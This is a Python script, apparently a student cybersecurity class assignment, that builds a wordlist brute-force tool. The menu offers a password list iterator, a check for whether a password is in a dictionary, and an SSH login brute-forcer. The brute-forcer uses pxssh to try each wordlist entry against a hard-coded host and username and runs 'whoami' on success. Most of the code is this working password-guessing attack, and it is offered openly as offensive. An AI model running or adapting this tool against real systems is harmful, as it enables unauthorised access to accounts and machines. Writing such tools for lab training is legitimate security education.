#!/usr/bin/env python3

# Script Name:                  Challenge17-bruteForce2
# Class Name:                   Ops 401
# Author Name:                  Cody Wishart
# Date of latest revision:      4/27/21
# Purpose:                      Create a bruteforce tool

# Import libraries
import time, getpass
from pexpect import pxssh

# Declare functions
def iterator ():
    filepath = input("Enter your dictionary filepath:\n")
    #filepath = '/home/osboxes/Desktop/rockyou2.txt' #test filepath
    
    file = open(filepath, encoding = "ISO-8859-1") # address encoding problem
    line = file.readline()
    while line:
        line = line.rstrip()
        word = line
        print(word)
        time.sleep(1)
        line = file.readline()
    file.close()

def check_password ():
    filepath = input("Enter your dictionary filepath:\n")
    userStr = input("Enter the password you'd like to search:\n")

    file = open(filepath, "r", encoding = "ISO-8859-1")
    check = 0

    for line in file:
        if userStr in line:
            check = 1
            break
    
    if check == 1:
        print ("The password ", userStr, " is contained within the dictionary.")
    else:
        print ("The password ", userStr, " is NOT contained within the dictionary.")

def sshAuth ():
    s = pxssh.pxssh()
    target = "10.0.0.2"
    username = "zeus"

    filepath = input("Enter your dictionary filepath:\n")
    file = open(filepath, "r", encoding = "ISO-8859-1")

    for line in file:
        try:
            s.login(target, username, line)
            s.sendline("whoami")
            s.logout()
        except pxssh.ExceptionPxssh as e:
            print ("Incorrect:", line)
            print (e)


    
    # s.login(target, port=22, username=username, password=line)

# Main

if __name__ == "__main__": # when my computer runs this file...do this stuff
    while True:
        mode = input("""
Brue Force Wordlist Attack Tool Menu
1 - Offensive, Dictionary Iterator
2 - Defensive, Password Recognized
3 - Offensive, SSH Authentication
4 - Exit
    Please enter a number: 
""")
        if (mode == "1"):
            iterator()
        elif (mode == "2"):
            check_password()
        elif (mode == '3'):
            sshAuth()
        elif (mode == '4'):
            break
        else:
            print("Invalid selection...") 
